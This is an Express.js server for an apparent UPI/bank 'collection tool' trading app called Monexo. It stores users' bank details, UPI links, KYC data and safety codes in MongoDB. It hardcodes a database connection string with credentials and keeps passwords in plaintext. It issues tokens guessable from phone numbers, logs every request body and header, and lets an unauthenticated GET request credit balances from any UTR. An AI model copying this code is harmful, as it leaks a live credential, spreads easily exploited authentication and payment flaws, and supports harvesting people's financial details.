import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import mongoose from 'mongoose';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

// Enable JSON and URL-encoded parsing with generous limits
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

// MongoDB Connection
const MONGO_URI = 'mongodb+srv://Ritik:Ritik906087@tdm.uwkxmdo.mongodb.net/TDM?retryWrites=true&w=majority';
console.log('Connecting to MongoDB...');
mongoose.connect(MONGO_URI)
  .then(() => console.log('Successfully connected to MongoDB.'))
  .catch((err) => console.error('Error connecting to MongoDB:', err));

// Mongoose Schemas
const userSchema = new mongoose.Schema({
  phone: { type: String, unique: true, required: true },
  password: { type: String, required: true },
  repassword: { type: String },
  invitercode: { type: String },
  safetyCode: { type: String },
  bankDetails: { type: Array, default: [] },
  upiDetails: { type: Array, default: [] },
  utrLogs: { type: Array, default: [] },
  balance: { type: Number, default: 10000 },
  commission: { type: Number, default: 120 },
  recharge: { type: Number, default: 0 },
  vipLevel: { type: Number, default: 1 },
  kycStatus: { type: Number, default: 0 },
  realName: { type: String, default: '' },
  parentUser: { type: String, default: '' },
  todayProfit: { type: Number, default: 0 },
  trc20Address: { type: String, default: '' },
  net: { type: String, default: '' },
  pageSize: { type: Number, default: 10 },
  totalTransferValue: { type: Number, default: 0 },
  collectionTools: { type: Array, default: null },
  token: { type: String },
  createdAt: { type: Date, default: Date.now }
});

const logSchema = new mongoose.Schema({
  endpoint: String,
  method: String,
  headers: mongoose.Schema.Types.Mixed,
  body: mongoose.Schema.Types.Mixed,
  query: mongoose.Schema.Types.Mixed,
  ip: String,
  timestamp: { type: Date, default: Date.now }
});

const transactionSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
  phone: String,
  rptNo: { type: String, unique: true },
  amount: Number,
  utr: { type: String, default: '' },
  currentStep: { type: Number, default: 0 }, // 0: unpaid/instructions, 1: upload cert, 2: reviewed/success
  payee_recipients_name: { type: String, default: 'Monexo Merchant' },
  payee_ifsc: { type: String, default: 'SBIN0001234' },
  payee_bank_account: { type: String, default: '918273645019' },
  payee_bankname: { type: String, default: 'State Bank of India' },
  payment_method: { type: Number, default: 0 }, // 0: bank, 1: upi
  payer_status: { type: Number, default: 2 }, // 2: pending, 1: paying, 3: success, 4: cancel, 5: timeout
  confirm_mode: { type: Number, default: 0 }, // 0: auto, 1: certify
  countdown: { type: Number, default: 1800 },
  reason_for_rejection: { type: String, default: '' },
  ctime: { type: Number, default: () => Math.floor(Date.now() / 1000) },
  type: { type: String, default: 'recharge' } // 'recharge' or 'sell'
});

const User = mongoose.model('User', userSchema);
const GeneralLog = mongoose.model('GeneralLog', logSchema);
const Transaction = mongoose.model('Transaction', transactionSchema);

function isPasswordEmpty(password) {
  if (password === undefined || password === null) return true;
  const p = String(password).trim();
  return p === '' || p === 'undefined' || p === 'null';
}

function getDefaultCollectionTools() {
  return [
    {
      id: "tool-paytm-business",
      name: "PayTM Business",
      type: 16,
      onlyPaymentFlag: 3,
      state: 2, // idle / online
      minSellToken: 2,
      limitConfig: JSON.stringify({ min: 100, max: 100000 }),
      inSell: 1,
      ctGuide: "If you Change your upi id, please relink right now!",
      account: "merchant@paytm",
      phone: "9182736450",
      remark: "Verified merchant partner"
    },
    {
      id: "tool-phonepe-business",
      name: "PhonePe Business",
      type: 19,
      onlyPaymentFlag: 3,
      state: 2,
      minSellToken: 2,
      limitConfig: JSON.stringify({ min: 100, max: 100000 }),
      inSell: 1,
      ctGuide: "Please check upi address before transfer",
      account: "merchant@ybl",
      phone: "9876543210",
      remark: "Instant settlement"
    },
    {
      id: "tool-amazon",
      name: "Amazon Pay",
      type: 18,
      onlyPaymentFlag: 3,
      state: 2,
      minSellToken: 2,
      limitConfig: JSON.stringify({ min: 100, max: 100000 }),
      inSell: 1,
      ctGuide: "Ensure your account status is active",
      account: "merchant@apl",
      phone: "9000100020",
      remark: "Super-fast settlement"
    }
  ];
}

// CORS configuration helper
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE, PATCH');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Accept, X-Requested-With, INDIATOKEN, token');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Middleware to capture and log ALL API requests to MongoDB
app.use('/xxapi', async (req, res, next) => {
  try {
    const log = new GeneralLog({
      endpoint: req.originalUrl,
      method: req.method,
      headers: req.headers,
      body: req.body,
      query: req.query,
      ip: req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress
    });
    await log.save();
    console.log(`[API Log] Saved request to ${req.originalUrl}`);
  } catch (err) {
    console.error('Error saving API log to MongoDB:', err);
  }
  next();
});

// Helper function to find user by header token
async function getUserByToken(req) {
  const token = req.headers['indiatoken'] || req.headers['token'] || req.headers['INDIATOKEN'];
  if (!token) return null;
  return await User.findOne({ token });
}

// 1. REGISTER ENDPOINT
app.post('/xxapi/register', async (req, res) => {
  try {
    const { phone, password, repassword, invitercode } = req.body;
    if (!phone || String(phone).trim() === '') {
      return res.json({ code: 400, msg: 'Phone number is required' });
    }
    if (isPasswordEmpty(password)) {
      return res.json({ code: 400, msg: 'Password cannot be empty' });
    }

    const token = `token-${phone}`;
    let user = await User.findOne({ phone });

    if (user) {
      user.password = password;
      user.repassword = repassword || password;
      user.invitercode = invitercode || user.invitercode;
      user.token = token;
      await user.save();
    } else {
      user = new User({
        phone,
        password,
        repassword: repassword || password,
        invitercode: invitercode || '',
        token,
        balance: 10000,
        commission: 120,
        collectionTools: getDefaultCollectionTools()
      });
      await user.save();
    }

    console.log(`[Register] User ${phone} registered/updated successfully.`);
    return res.json({
      code: 0,
      msg: 'success',
      data: { token }
    });
  } catch (err) {
    console.error('Registration Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// SMS and Registration flow helpers
app.post('/xxapi/checkSmsNew', async (req, res) => {
  console.log('[checkSmsNew] Called', req.body);
  const { phone, password } = req.body;
  if (!phone || String(phone).trim() === '') {
    return res.json({ code: 400, msg: 'Phone number is required' });
  }
  if (isPasswordEmpty(password)) {
    return res.json({ code: 400, msg: 'Password cannot be empty' });
  }
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

app.post('/xxapi/getsendtken', async (req, res) => {
  console.log('[getsendtken] Called', req.body);
  const phone = req.body.phone || 'default';
  return res.json({
    code: 0,
    msg: 'success',
    data: `sendtoken-${phone}-${Date.now()}`
  });
});

app.post('/xxapi/sendLoginSms', async (req, res) => {
  console.log('[sendLoginSms] Called', req.body);
  const { phone, password } = req.body;
  if (!phone || String(phone).trim() === '') {
    return res.json({ code: 400, msg: 'Phone number is required' });
  }
  if (isPasswordEmpty(password)) {
    return res.json({ code: 400, msg: 'Password cannot be empty' });
  }
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

app.post('/xxapi/sendsms', async (req, res) => {
  console.log('[sendsms] Called', req.body);
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

app.get('/xxapi/sliderCaptcha', async (req, res) => {
  console.log('[sliderCaptcha] Called');
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

// 2. LOGIN ENDPOINT
app.post('/xxapi/login', async (req, res) => {
  try {
    const { phone, password } = req.body;
    if (!phone || String(phone).trim() === '') {
      return res.json({ code: 400, msg: 'Phone number is required' });
    }
    if (isPasswordEmpty(password)) {
      return res.json({ code: 400, msg: 'Password cannot be empty' });
    }

    const token = `token-${phone}`;
    let user = await User.findOne({ phone });

    if (!user) {
      user = new User({
        phone,
        password,
        token,
        balance: 10000,
        commission: 120,
        collectionTools: getDefaultCollectionTools()
      });
      await user.save();
      console.log(`[Login] Auto-registered new user: ${phone}`);
    } else {
      if (user.password !== password) {
        return res.json({ code: 400, msg: 'Incorrect password' });
      }
      user.token = token;
      await user.save();
      console.log(`[Login] User ${phone} logged in successfully.`);
    }

    return res.json({
      code: 0,
      msg: 'success',
      data: { token }
    });
  } catch (err) {
    console.error('Login Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// 3. USERINFO ENDPOINT
app.get('/xxapi/userinfo', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({
        code: 0,
        msg: 'success',
        data: {
          phone: 'Guest',
          balance: 10000,
          commission: 120,
          withdrawable: 10000,
          recharge: 0,
          vipLevel: 1,
          invitercode: '123456',
          safetyCodeSet: false,
          bankCount: 0,
          upiCount: 0,
          kycStatus: 0,
          realName: ''
        }
      });
    }

    return res.json({
      code: 0,
      msg: 'success',
      data: {
        uid: user._id,
        username: user.phone,
        phone: user.phone,
        balance: user.balance ?? 10000,
        commission: user.commission ?? 120,
        withdrawable: user.balance ?? 10000,
        recharge: user.recharge ?? 0,
        vipLevel: user.vipLevel ?? 1,
        invitercode: user.invitercode || '123456',
        safetyCodeSet: !!user.safetyCode,
        bankCount: user.bankDetails ? user.bankDetails.length : 0,
        upiCount: user.upiDetails ? user.upiDetails.length : 0,
        kycStatus: user.kycStatus ?? 0,
        realName: user.realName || '',
        parentUser: user.parentUser || '',
        todayProfit: user.todayProfit ?? 0,
        trc20Address: user.trc20Address || '',
        net: user.net || '',
        pageSize: user.pageSize || 10,
        totalTransferValue: user.totalTransferValue || 0
      }
    });
  } catch (err) {
    console.error('Userinfo Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// 4. BANK ENDPOINTS
app.post('/xxapi/bank', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({ code: 403, msg: 'Unauthorized' });
    }

    const bankData = req.body;
    if (!user.bankDetails) user.bankDetails = [];
    user.bankDetails.push(bankData);
    user.markModified('bankDetails');
    await user.save();

    console.log(`[Bank] Added bank details for ${user.phone}`);
    return res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('Bank Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.post('/xxapi/bank/edit', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({ code: 403, msg: 'Unauthorized' });
    }

    const bankData = req.body;
    user.bankDetails = [bankData];
    user.markModified('bankDetails');
    await user.save();

    console.log(`[Bank] Edited bank details for ${user.phone}`);
    return res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('Bank Edit Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.get('/xxapi/bank', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    return res.json({
      code: 0,
      msg: 'success',
      data: user ? (user.bankDetails || []) : []
    });
  } catch (err) {
    console.error('Get Bank List Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.post('/xxapi/bank/pause', async (req, res) => {
  return res.json({ code: 0, msg: 'success' });
});

app.post('/xxapi/bank/active', async (req, res) => {
  return res.json({ code: 0, msg: 'success' });
});

app.get('/xxapi/availablebank', async (req, res) => {
  const user = await getUserByToken(req);
  return res.json({
    code: 0,
    msg: 'success',
    data: user ? (user.bankDetails || []) : []
  });
});

// 5. UPI ENDPOINTS
app.post('/xxapi/authupi', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({ code: 403, msg: 'Unauthorized' });
    }

    const { ctid, utr } = req.body;
    
    // Set the state of collection tool with matching id to active
    if (!user.collectionTools) {
      user.collectionTools = getDefaultCollectionTools();
    }
    
    const tool = user.collectionTools.find(t => t.id === ctid);
    if (tool) {
      tool.state = 2; // Idle / online
      tool.inSell = 1; // Active in sell
    }
    
    if (!user.upiDetails) user.upiDetails = [];
    user.upiDetails.push({ ctid, utr, date: new Date() });
    
    user.markModified('collectionTools');
    user.markModified('upiDetails');
    await user.save();

    console.log(`[UPI] Authenticated UPI details for ${user.phone}`);
    return res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('Auth UPI Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

app.get('/xxapi/upidetail/:id', async (req, res) => {
  return res.json({ code: 0, msg: 'success', data: {} });
});

// 6. SAFETY CODE ENDPOINT
app.post('/xxapi/safety_code', async (req, res) => {
  try {
    const user = await getUserByToken(req);
    if (!user) {
      return res.json({ code: 403, msg: 'Unauthorized' });
    }

    const code = req.body.safety_code || req.body.code || req.body.safetyCode;
    user.safetyCode = code;
    await user.save();

    console.log(`[Safety Code] Saved safety code for ${user.phone}`);
    return res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('Safety Code Error:', err);
    return res.json({ code: 500, msg: 'Internal server error' });
  }
});

// 7. KYC ENDPOINTS
app.get('/xxapi/cwkyc', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  return res.json({
    code: 0,
    msg: "success",
    data: user.kycDetails || {
      realName: user.realName || '',
      idCard: '',
      status: user.kycStatus ?? 0,
      rejectReason: ''
    }
  });
});

app.post('/xxapi/cwkyc', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  user.kycDetails = req.body;
  user.realName = req.body.realName || req.body.name || user.realName;
  user.kycStatus = 1; // Submitted / Approved (we can instantly approve for premium UX!)
  user.markModified('kycDetails');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

app.patch('/xxapi/cwkyc', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  user.kycDetails = { ...(user.kycDetails || {}), ...req.body };
  user.realName = req.body.realName || req.body.name || user.realName;
  user.kycStatus = 1;
  user.markModified('kycDetails');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

// 8. CONFIG ENDPOINTS (No live vercel fetch - completely isolated local data)
app.get('/xxapi/config', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      usdtExchangerate: "80",
      currency: "INR",
      registerHost: "https://refer.vantage.top/#/rs/",
      tgChannelLink: "xxxx",
      rewardRules: {
        freeze_comp_reward: { name: "freeze_comp_reward", fixed: 0, ratio: 0, minCondi: 0, ruleActive: 0, rule: "{}" },
        inr_buy_dividend: { name: "inr_buy_dividend", fixed: 0, ratio: 0, minCondi: 0, ruleActive: 1, rule: "{\"1\": 0.003, \"2\": 0.002, \"3\": 0.001}" },
        inr_buy_reward: { name: "inr_buy_reward", fixed: 0, ratio: 2.5, minCondi: 1, ruleActive: 0, rule: "{\"rate_change\": \"2.0,2.5\", \"fixed_change\": \"0,0\"}" },
        inr_buy_reward_0: { name: "inr_buy_reward_0", fixed: 0, ratio: 2.5, minCondi: 0, ruleActive: 1, rule: "{\"rate_change\": \"2.0,2.5\", \"fixed_change\": \"0,0\"}" },
        today_buy_times_reward: { name: "today_buy_times_reward", fixed: 0, ratio: 0, minCondi: 0, ruleActive: 1, rule: "{\"1\": 10, \"3\": 20, \"5\": 20, \"10\": 50}" },
        usdt_buy_dividend: { name: "usdt_buy_dividend", fixed: 0, ratio: 0, minCondi: 100, ruleActive: 1, rule: "{\"1\": 0.003, \"2\": 0.001, \"3\": 0.0}" }
      },
      bannerSrcs: [
        "https://picsum.photos/seed/1/800/400",
        "https://picsum.photos/seed/2/800/400",
        "https://picsum.photos/seed/3/800/400"
      ],
      newsList: [
        { id: 32, cover: "", name: "securityupdate", code: "", type: 1, content: "Update verified", crtDate: 1779259339, crtUser: "alan", sort: 4 }
      ],
      pinFlag: false,
      ctTypes: [16, 1, 17, 2, 18, 3, 19, 4, 7, 9],
      ctTypesPayType: { "1": 2, "2": 2, "3": 1, "4": 2, "7": 3, "9": 2, "16": 2, "17": 2, "18": 1, "19": 2 },
      ifFinishNewbieActivity: 0,
      rptPaymentMode: 1,
      webLicenseId: "19711455",
      userBalShowReal: 0,
      sevenDayBuyEnabled: 0,
      v: 2039,
      pv: 3
    }
  });
});

app.get('/xxapi/simpConfig', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      siteName: "Monexo",
      logo: "favicon.ico",
      customerServiceUrl: "https://t.me/xxxx"
    }
  });
});

// 9. COLLECTION TOOL ENDPOINTS
app.get('/xxapi/collectiontoollist', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  if (!user.collectionTools || user.collectionTools.length === 0) {
    user.collectionTools = getDefaultCollectionTools();
    await user.save();
  }
  return res.json({ code: 0, msg: 'success', data: user.collectionTools });
});

app.get('/xxapi/collectiontool', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  if (!user.collectionTools || user.collectionTools.length === 0) {
    user.collectionTools = getDefaultCollectionTools();
    await user.save();
  }
  return res.json({ code: 0, msg: 'success', data: user.collectionTools[0] });
});

app.post('/xxapi/collectiontoolStatus', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const { id, inSell, state } = req.body;
  if (!user.collectionTools) user.collectionTools = getDefaultCollectionTools();
  const tool = user.collectionTools.find(t => t.id === id);
  if (tool) {
    if (inSell !== undefined) tool.inSell = Number(inSell);
    if (state !== undefined) tool.state = Number(state);
  }
  user.markModified('collectionTools');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

app.post('/xxapi/collectiontool/startsell', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const { id } = req.body;
  if (!user.collectionTools) user.collectionTools = getDefaultCollectionTools();
  const tool = user.collectionTools.find(t => t.id === id);
  if (tool) {
    tool.inSell = 1;
    tool.state = 2; // idle / active
  }
  user.markModified('collectionTools');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

app.post('/xxapi/collectiontool/stopsell', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const { id } = req.body;
  if (!user.collectionTools) user.collectionTools = getDefaultCollectionTools();
  const tool = user.collectionTools.find(t => t.id === id);
  if (tool) {
    tool.inSell = 0;
    tool.state = 0; // disabled
  }
  user.markModified('collectionTools');
  await user.save();
  return res.json({ code: 0, msg: 'success' });
});

app.get('/xxapi/availablect', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 0, msg: 'success', data: [] });
  if (!user.collectionTools || user.collectionTools.length === 0) {
    user.collectionTools = getDefaultCollectionTools();
    await user.save();
  }
  return res.json({ code: 0, msg: 'success', data: user.collectionTools });
});

// 10. RECHARGE, DEPOSIT AND TRANSACTION ENDPOINTS
app.all('/xxapi/rechargeConfirm', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  
  const amount = Number(req.body.amount || req.query.amount || 1000);
  const rptNo = `RPT${Date.now()}`;
  
  const tx = new Transaction({
    userId: user._id,
    phone: user.phone,
    rptNo: rptNo,
    amount: amount,
    type: 'recharge',
    currentStep: 0,
    payer_status: 1
  });
  await tx.save();
  
  return res.json({
    code: 0,
    msg: 'success',
    data: rptNo
  });
});

app.get('/xxapi/rechargeToken', async (req, res) => {
  const rptNo = req.query.rptNo || req.body.rptNo;
  const tx = await Transaction.findOne({ rptNo });
  if (!tx) {
    return res.json({ code: 404, msg: 'Transaction not found' });
  }
  return res.json({
    code: 0,
    msg: 'success',
    data: tx
  });
});

app.get('/xxapi/chargeUtr/:rptNo/:utr', async (req, res) => {
  const { rptNo, utr } = req.params;
  const tx = await Transaction.findOne({ rptNo });
  if (!tx) return res.json({ code: 404, msg: 'Transaction not found' });
  
  tx.utr = utr;
  tx.currentStep = 2; // review step
  tx.payer_status = 3; // Success! Auto-approve for amazing UX
  await tx.save();
  
  // Instant local credit to user balance
  const user = await User.findOne({ phone: tx.phone });
  if (user) {
    user.balance = (user.balance || 0) + tx.amount;
    await user.save();
  }
  
  return res.json({ code: 0, msg: 'success', data: tx });
});

app.get('/xxapi/chargeCancel/:rptNo', async (req, res) => {
  const { rptNo } = req.params;
  const tx = await Transaction.findOne({ rptNo });
  if (!tx) return res.json({ code: 404, msg: 'Transaction not found' });
  
  tx.payer_status = 4; // Cancelled
  await tx.save();
  return res.json({ code: 0, msg: 'success' });
});

app.get('/xxapi/chargeStatus/:rptNo', async (req, res) => {
  const { rptNo } = req.params;
  const tx = await Transaction.findOne({ rptNo });
  if (!tx) return res.json({ code: 404, msg: 'Transaction not found' });
  return res.json({ code: 0, msg: 'success', data: tx.payer_status });
});

app.get('/xxapi/chargeToken/history', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const txs = await Transaction.find({ userId: user._id, type: 'recharge' }).sort({ ctime: -1 });
  return res.json({ code: 0, msg: 'success', data: txs });
});

app.get('/xxapi/transferToken/history', async (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

// 11. SELL AND WITHDRAWAL ENDPOINTS
app.get('/xxapi/sell/history', async (req, res) => {
  const user = await getUserByToken(req);
  if (!user) return res.json({ code: 403, msg: 'Unauthorized' });
  const txs = await Transaction.find({ userId: user._id, type: 'sell' }).sort({ ctime: -1 });
  return res.json({ code: 0, msg: 'success', data: txs });
});

app.post('/xxapi/sell/question', async (req, res) => {
  return res.json({ code: 0, msg: 'success' });
});

app.get('/xxapi/minSellIToken/:param1/:param2', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: 100 });
});

app.get('/xxapi/minMaxUpiSell/:param1/:param2/:param3', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: { min: 100, max: 100000 } });
});

// 12. TEAM & LOGISTICS
app.get('/xxapi/teaminfo', async (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      teamSize: 0,
      totalRecharge: 0,
      totalWithdraw: 0,
      todayActiveCount: 0,
      yesterdayActiveCount: 0,
      commissionRate: "1.2%",
      level1Count: 0,
      level2Count: 0,
      level3Count: 0
    }
  });
});

app.get('/xxapi/teaminfothree/:param', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

app.get('/xxapi/myTeam', async (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

app.get('/xxapi/quotaLog', async (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

// 13. NEWS & OTHER HELPERS
app.get('/xxapi/news/code/:code', (req, res) => {
  return res.json({
    code: 0,
    msg: "success",
    data: {
      id: 32,
      cover: "",
      name: "securityupdate",
      code: req.params.code,
      type: 1,
      content: "All services running securely. Local fast trading enabled.",
      crtDate: 1779259339,
      crtUser: "Admin",
      sort: 4
    }
  });
});

app.get('/xxapi/bguide/guides', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: [] });
});

app.get('/xxapi/todayProfit', (req, res) => {
  return res.json({ code: 0, msg: 'success', data: { todayProfit: 0 } });
});

app.get('/xxapi/unread_list', (req, res) => res.json({ code: 0, msg: "success", data: [] }));
app.get('/xxapi/all_list', (req, res) => res.json({ code: 0, msg: "success", data: [] }));

// Generic fallback for any other unhandled xxapi requests
app.all('/xxapi/*', async (req, res) => {
  console.log(`[Local API Fallback] ${req.method} called on ${req.originalUrl}`, req.body);
  return res.json({
    code: 0,
    msg: 'success',
    data: {}
  });
});

// Serve static assets from the current directory
app.use(express.static(__dirname));

// For SPA routing fallback to index.html
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
});
